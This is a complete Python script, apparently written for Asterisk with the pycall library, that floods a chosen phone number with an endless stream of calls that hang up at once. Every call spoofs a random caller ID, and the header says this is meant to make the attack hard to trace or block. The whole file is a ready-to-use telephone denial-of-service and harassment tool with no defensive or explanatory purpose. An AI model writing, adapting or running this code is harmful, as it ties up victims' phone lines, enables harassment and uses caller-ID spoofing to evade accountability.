#!/usr/bin/python

"""
advanced-flood.py

@author:        Randall Degges
@email:         rdegges@gmail.com
@date:          11-20-09

This program floods the specified phone number and spoofs caller ID making it
much harder to trace / prevent.
"""

from time import sleep
from sys import argv, exit
from pycall.callfile import *
from random import seed, randint

def genid():
        """
        Generate a random 10-digit US telephone number for spoofing to.
        """
        return str(randint(1000000000, 9999999999))

def call(num, cid):
        """
        Create a call to the specified number which does nothing except hang up.
        Also spoofs caller ID to a random 10 digit number.
        """
        testcall = CallFile(
                trunk_type = 'SIP',
                trunk_name = 'flowroute',
                callerid_num = cid,
                number = num,
                application = 'Hangup',
                data = ' ',
                user = 'asterisk'
        )
        testcall.run()

def main():
        """
        Control the application logic.
        """
        seed()  # seed the random number generator

        if len(argv) < 3:
                print 'Usage: %s [number] [calls-per-minute]' % argv[0]
                exit(1)

        number = argv[1]
        try:
                cpm = int(argv[2])
        except ValueError:
                cpm = 1

        print 'Starting call flood on target: %s. Placing %d calls per minute.' % (number, cpm)

        count = 1
        while True:
                for x in xrange(cpm):
                        cid = genid()
                        print 'Placing call %d using caller ID %s...' % (count, cid)
                        call(number, cid)
                        count = count + 1
                sleep(60)

if __name__ == '__main__':
        """
        Program execution begins here.
        """
        main()